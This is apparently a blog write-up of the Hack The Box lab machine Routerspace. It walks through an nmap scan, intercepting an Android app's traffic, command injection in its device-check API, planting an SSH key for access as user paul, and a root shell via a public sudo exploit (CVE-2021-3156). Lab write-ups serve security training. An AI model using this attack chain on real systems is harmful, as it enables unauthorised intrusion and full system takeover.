---
layout: post
title: Hack The Box Routerspace - Writeup
lang: en
ref: Routerspace
---

Routerspace is a Linux level easy Hack The Box machine.

## Nmap scan

```bash
# Nmap 7.92 scan initiated Sun 03 Apr 2022 05:00:31 PM UTC as: nmap -sCV -v -p22,80 -oN targeted 10.129.227.47                                                                                                                   
Nmap scan report for 10.129.227.47                                                                                                                                                                                        
Host is up (0.041s latency).                                                                                                                                                                                                
                                                                                                                                                                                                                            
PORT   STATE SERVICE VERSION                                                                                                                                                                                                
22/tcp open  ssh     (protocol 2.0)                                                                                                                                                                                         
| ssh-hostkey:                                                                                                                                                                                                              
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)                                                                                                                                                              
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)                                                                                                                                                             
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)                                                                                                                                                           
| fingerprint-strings:                                                                                                                                                                                                      
|   NULL:                                                                                                                                                                                                                   
|_    SSH-2.0-RouterSpace Packet Filtering V1                                                                                                                                                                               
80/tcp open  http                                                                                                                                                                                                           
| fingerprint-strings:                                                                                                                                                                                                      
|   FourOhFourRequest:                                                                                                                                                                                                      
|     HTTP/1.1 200 OK                                                                                                                                                                                                       
|     X-Powered-By: RouterSpace                                                                                                                                                                                             
|     X-Cdn: RouterSpace-22054                                                                                                                                                                                              
|     Content-Type: text/html; charset=utf-8                                                                                                                                                                                
|     Content-Length: 65                                                                                                                                                                                                    
|     ETag: W/"41-s83i2tENuixVMkCwprJcJLpgIac"                                                                                                                                                                              
|     Date: Sat, 02 Apr 2022 17:38:37 GMT                                                                                                                                                                                   
|     Connection: close                                                                                                                                                                                                     
|     Suspicious activity detected !!! {RequestID: XSR 5 e 30 Dlc }                                                                                                                                                         
|   GetRequest:                                                                                                                                                                                                             
|     HTTP/1.1 200 OK                                                                                                                                                                                                       
|     X-Powered-By: RouterSpace                                                                                                                                                                                             
|     X-Cdn: RouterSpace-45124                                                                                                                                                                                              
|     Accept-Ranges: bytes                                                                                                                                                                                                  
|     Cache-Control: public, max-age=0                                                                                                                                                                                      
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT                                                                                                                                                                          
|     ETag: W/"652c-17d476c9285"                                                                                                                                                                                            
|     Content-Type: text/html; charset=UTF-8                                                                                                                                                                                
|     Content-Length: 25900                                                                                                                                                                                                 
|     Date: Sat, 02 Apr 2022 17:38:37 GMT                                                                                                                                                                                   
|     Connection: close                                                                                                                                                                                                     
|     <!doctype html>                                                                                                                                                                                                       
|     <html class="no-js" lang="zxx">                                                                                                                                                                                       
|     <head>                                                                                                                                                                                                                
|     <meta charset="utf-8">                                                                                                                                                                                                
|     <meta http-equiv="x-ua-compatible" content="ie=edge">                                                                                                                                                                 
|     <title>RouterSpace</title>                                                                                                                                                                                            
|     <meta name="description" content="">                                                                                                                                                                                  
|     <meta name="viewport" content="width=device-width, initial-scale=1">                                                                                                                                                  
|     <link rel="stylesheet" href="css/bootstrap.min.css">                                                                                                                                                                  
|     <link rel="stylesheet" href="css/owl.carousel.min.css">                                                                                                                                                               
|     <link rel="stylesheet" href="css/magnific-popup.css">                                                                                                                                                                 
|     <link rel="stylesheet" href="css/font-awesome.min.css">                                                                                                                                                               
|     <link rel="stylesheet" href="css/themify-icons.css">                                                                                                                                                                  
|   HTTPOptions:                                                                                                                                                                                                            
|     HTTP/1.1 200 OK                                                                                                                                                                                                       
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-17816
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Sat, 02 Apr 2022 17:38:37 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: F1B93D33073369B7F897021F930C04B0
|_http-trane-info: Problem with XML parsing of /evox/about
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=4/2%Time=62488A1D%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=4/2%Time=62488A1D%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
SF:-Cdn:\x20RouterSpace-45124\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
SF:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021
SF:\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x2
SF:0Sat,\x2002\x20Apr\x202022\x2017:38:37\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<h
SF:ead>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<met
SF:a\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\x
SF:20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"descr
SF:iption\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x
SF:20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x2
SF:0\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.m
SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/m
SF:agnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"sty
SF:lesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,108
SF:,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20R
SF:outerSpace-17816\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZY
SF:GrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Sat,\x2002\x20Apr\x202022\x2017:38:
SF:37\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest,
SF:2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"
SF:)%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(FourOhFourRequest,127,"HTTP/1\.1\x20200\x20OK\r\nX-Pow
SF:ered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-22054\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2065\r\nETag:\x20W/
SF:\"41-s83i2tENuixVMkCwprJcJLpgIac\"\r\nDate:\x20Sat,\x2002\x20Apr\x20202
SF:2\x2017:38:37\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20activ
SF:ity\x20detected\x20!!!\x20{RequestID:\x20XSR\x20\x20\x205\x20e\x20\x20\
SF:x2030\x20Dlc\x20}");

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun 03 Apr 2022 05:00:31 PM UTC -- 1 IP address (1 host up) scanned in 15.72 seconds
```

### Port 80

![](/assets/writeups/htb-routerspace/static-page.png)

We will get just a static page to download an the routerspace.apk. Let's download it.

## Routerspace.apk

Now we can reverse the .apk with apktool for example, or run it on an emulator. I used anbox to run it on my kali machine.

![](/assets/writeups/htb-routerspace/routerspace_apk.png)

We can see the button, "Check status". I want to use Burpsuite to see what's happening, but first we need to set the proxy using this adb command.

```bash
adb shell settings put global http_proxy 10.10.14.59:8080
```

Remember to configure in burpsuite to "listen" in your ip:8080

We can see now that the app is doing a request to `api/v4/monitoring/router/dev/check/deviceAccess`

![](/assets/writeups/htb-routerspace/check_device_access.png)

## RCE 

Let's send it to the repeater, and let's try if we can inject commands, and... Yes, we can!

![](/assets/writeups/htb-routerspace/rce.png)

I tried to get a reverse shell, but wasn't working. So I decided to create a new id_rsa.pub to add it inside paul's /home/paul/.ssh.

```bash
> ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/edbrsk/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/edbrsk/.ssh/id_rsa
Your public key has been saved in /home/edbrsk/.ssh/id_rsa.pub

> ls
id_rsa  id_rsa.pub

> cat id_rsa.pub | xclip -sel clip
```

![](/assets/writeups/htb-routerspace/id_rsa.png)

With this we can ssh as Paul into our victim machine.

```bash
ssh paul@10.129.227.47 -i id_rsa
The authenticity of host '10.129.227.47 (10.129.227.47)' can't be established.
ED25519 key fingerprint is SHA256:iwHQgWKu/VDyjka2Y4j2V8P2Rk6K13HuNT4JTnITIDk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.227.47' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage

System information as of Sun 03 Apr 2022 05:00:31 PM UTC

System load:           0.0
Usage of /:            71.0% of 3.49GB
Memory usage:          17%
Swap usage:            0%
Processes:             213
Users logged in:       0
IPv4 address for eth0: 10.129.227.47
IPv6 address for eth0: dead:beef::250:56ff:fe96:35cb


80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133
paul@routerspace:~$ 
```

## Privilege escalation

I used linpeas after some manual recon, and linpeas detected that the version of sudo (1.8.31) is vulnerable. Here is the exploit [CVE-2021-3156](https://github.com/worawit/CVE-2021-3156/blob/main/exploit_userspec.py)

We can upload the exploit using scp:

```bash
scp -i /home/edbrsk/.ssh/id_rsa exploit_nss.py paul@10.129.227.47:.
```

Execute it, and we will obtain a shell as root

```bash
paul@routerspace:~$ ./exploit_nss.py 
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
# cat /root/root.txt
```
